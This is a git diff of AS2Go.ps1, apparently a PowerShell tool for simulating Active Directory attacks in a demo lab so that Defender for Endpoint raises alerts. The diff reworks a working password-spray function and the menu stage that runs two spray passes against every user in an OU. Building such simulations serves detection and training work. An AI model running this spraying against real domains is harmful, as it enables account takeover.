@@ -19,9 +19,9 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2022-10-30
-File Name  : AS2Go.ps1 | Version 2.5.5
-Author     : Holger Zimmermann | holgerz@semperis.com | @HerrHozi
+last update: 2022-11-04
+File Name  : AS2Go.ps1 | Version 2.5.6
+Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
 .EXAMPLE
@@ -45,6 +45,7 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
+# 2022-11-04 | v2.5.6 |  ADD Function New-PasswordSprayAttack
 # 2022-10-15 | v2.5.5 |  ADD Function Kerberoasting
 # 2022-10-13 | v2.1.1 |  Update Function Start-AS2GoDemo | Protected User Error Routine
 # 2022-10-08 | v2.1.0 |  Update Function New-BackDoorUser
@@ -69,8 +70,8 @@ https://herrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-$lastupdate   = "2022-10-30"
-$version      = "2.5.5.0" 
+$lastupdate   = "2022-11-04"
+$version      = "2.5.6.0" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
@@ -117,19 +118,22 @@ $GroupGPO  = "Group Policy Creator Owners"
 Function New-PasswordSprayAttack()
 {
 
-    Param([string] $Domain, [string] $Password, [string] $SearchBase)
+    Param([string] $Domain, [string] $Password, [string] $SearchBase, [string] $NoR)
 
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
 
-        $i = 0
+        $Step = 0
         $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase
+        $TotalSteps = $ADUsers.Count
+        
         Foreach ($ADUSer in $ADUsers) 
         {
-           $i += 1
+           $Step += 1
            $user =   $Domain + "\" + $ADUSer.samaccountname
-           Set-ProgressBar -Step $i -User $user -TotalSteps $ADUsers.Count
-        
+           $progress = [int] (($Step - 1) / $TotalSteps * 100)
+           Write-Progress -Activity "Run Password Spray # $NoR against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
+           #Set-ProgressBar -Step $i -User $user -TotalSteps $ADUsers.Count
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry("",$user,$Password)
            if ($Domain_check.name -ne $null)
               {
@@ -146,7 +150,6 @@ Write-Log -Message "### End Function $myfunction ###"
 Function Set-ProgressBar 
 {
     Param ([int] $Step, [int] $TotalSteps, [string] $User)
-
     $progress = [int] (($Step - 1) / $TotalSteps * 100)
     Write-Progress -Activity "Run Password Spray against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
 }
@@ -1929,10 +1932,11 @@ Get-AS2GoSettings
 ######                Attack Level -  Bruce Force Account                  #####
 ######                                                                     #####
 ################################################################################
+
 Clear-Host
 Update-WindowTitle -NewTitle $stage05
-#Set-KeyValue -key "LastStage" -NewValue $stage10
-Show-Step -step "step_006.html"
+Set-KeyValue -key "LastStage" -NewValue $stage05
+Show-Step -step "step_004.html"
 Do 
 {
 Clear-Host
@@ -1956,24 +1960,40 @@ $MyPath   = Get-KeyValue -key "MySearchBase"
 $NoU = (Get-ADUser -filter * -SearchBase $MyPath).count
 
 #first run with random password
-$MyPW01     = Get-RandomPassword
+$MyPW01 = Get-RandomPassword
+#second run with valid password
+$MyPW02 = Get-KeyValue -key "SP01"
 
-$MyPW02 = "P@ssWord!"
-$question = "`nType in a known password. Do you like to use this password '$MyPW02' for the next run - Y or N? Default "
+Do
+{
+$question = "`nDo you like to use this password '$MyPW02' for the second next run - Y or N? Default "
 $prompt   = Get-Answer -question $question -defaultValue $yes
+
 if ($prompt -ne $yes) 
    {
-   $MyPW02 = Read-Host "Enter another password:"
+   $MyPW02 = Read-Host "Enter new password"
+   Set-KeyValue -key "SP01" -NewValue $MyPW02
    }
-       
-Write-Host ""
-Write-Host "First run with password $MyPW01 against $NoU users from OU $MyPath" #-ForegroundColor $global:FGCHighLight
-Write-Host "Second run with password $MyPW02 against $NoU users from OU $MyPath" # -ForegroundColor $global:FGCHighLight
+   
+} Until ($prompt -eq $yes)
+
+
+
+# example - First run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp       
+Write-Host "`nFirst run with password " -NoNewline; Write-host $MyPW01 -NoNewline -ForegroundColor Yellow
+Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
+Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
+
+# example - Second run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp    
+Write-Host "Second run with password " -NoNewline; Write-host $MyPW02 -NoNewline -ForegroundColor Yellow
+Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
+Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
 Write-Host ""
 pause
-New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath
-New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath
 
+New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
+New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"
+Write-Host ""
 pause
 }
 elseIf ($answer -eq $exit)
